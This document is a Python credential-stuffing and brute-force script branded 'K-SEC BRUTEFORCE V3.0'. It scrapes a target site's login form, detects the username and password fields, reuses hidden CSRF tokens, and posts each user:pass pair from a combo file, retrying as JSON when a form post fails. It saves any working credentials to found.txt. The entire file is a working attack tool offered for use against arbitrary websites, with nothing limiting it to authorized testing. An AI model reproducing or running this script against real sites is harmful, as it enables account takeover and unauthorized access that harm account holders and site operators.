import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import time


init(autoreset=True)

def display_banner():
    banner = f"""
{Fore.CYAN}  _  __       {Fore.MAGENTA}  _____ ______ _____ 
{Fore.CYAN} | |/ /       {Fore.MAGENTA} / ____|  ____/ ____|
{Fore.CYAN} | ' / ______ {Fore.MAGENTA}| (___ | |__ | |     
{Fore.CYAN} |  < |______|{Fore.MAGENTA} \___ \|  __|| |     
{Fore.CYAN} | . \        {Fore.MAGENTA} ____) | |___| |____ 
{Fore.CYAN} |_|\_\       {Fore.MAGENTA}|_____/|______\_____|
          {Fore.YELLOW}>> K-SEC BRUTEFORCE V3.0 <<
          {Fore.WHITE}Authored by: blaxkmiradev
    """
    print(banner)

def get_form_details(session, url):
    """Automatically scans the URL for form fields and CSRF tokens"""
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
    
        form = soup.find('form')
        action = url # Default to current URL
        if form and form.get('action'):
            # Handle relative paths (e.g., /login vs https://site.com/login)
            if form.get('action').startswith('http'):
                action = form.get('action')
            else:
                from urllib.parse import urljoin
                action = urljoin(url, form.get('action'))

      
        inputs = {}
        u_field, p_field = None, None
        
        for inp in soup.find_all('input'):
            name = inp.get('name') or inp.get('id')
            itype = inp.get('type', 'text').lower()
            val = inp.get('value', '')

            if itype == 'password':
                p_field = name
            elif itype in ['text', 'email', 'username'] and not u_field:
                u_field = name
            
            # Keep hidden inputs like CSRF tokens
            if itype == 'hidden' and name:
                inputs[name] = val
                
        return action, u_field, p_field, inputs
    except Exception as e:
        print(f"{Fore.RED}[!] Scan Error: {e}")
        return url, None, None, {}

def start_audit():
    display_banner()
    
    target_url = input(f"{Fore.CYAN}[?] Enter Target URL: ")
    combo_file = input(f"{Fore.CYAN}[?] Enter Combo File (user:pass): ")
    success_key = input(f"{Fore.CYAN}[?] Success Indicator (e.g. Dashboard): ")
    invalid_key = input(f"{Fore.CYAN}[?] Invalid Indicator (e.g. SweetAlert): ")

    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) K-SEC/3.0'})

  
    print(f"{Fore.YELLOW}[*] Scanning {target_url}...")
    action_url, u_name, p_name, hidden_data = get_form_details(session, target_url)

    if not u_name or not p_name:
        print(f"{Fore.RED}[!] Could not detect login fields. Check if the URL is correct.")
        return

    print(f"{Fore.GREEN}[+] Target Found: {u_name} & {p_name}")
    print(f"{Fore.YELLOW}[!] Starting Brute Force...\n")

    try:
        with open(combo_file, 'r', encoding='utf-8') as f:
            for line in f:
                if ":" not in line: continue
                username, password = line.strip().split(":", 1)
                
                # Build payload with detected fields + hidden CSRF tokens
                payload = {u_name: username, p_name: password}
                payload.update(hidden_data)

                try:
                   
                    res = session.post(action_url, data=payload, allow_redirects=True, timeout=10)
                    
                    # If that fails (status 400 or 415), try Attempt 2: JSON Data (Common on Vercel)
                    if res.status_code in [400, 415, 405]:
                        res = session.post(action_url, json=payload, allow_redirects=True, timeout=10)

                   
                    if success_key.lower() in res.url.lower() or success_key in res.text:
                        print(f"{Fore.GREEN}[SUCCESS] {username}:{password} | URL: {res.url}")
                        with open("found.txt", "a") as out:
                            out.write(f"{username}:{password}\n")
                        return # Exit when found
                
                    elif invalid_key in res.text:
                        print(f"{Fore.RED}[FAILED] {username}:{password}")
                    else:
                        print(f"{Fore.WHITE}[UNKNOWN] {username}:{password} (Code: {res.status_code})")

                except Exception as e:
                    print(f"{Fore.RED}[!] Request Error: {e}")
                    
    except FileNotFoundError:
        print(f"{Fore.RED}[!] File '{combo_file}' not found.")

if __name__ == "__main__":
    start_audit()
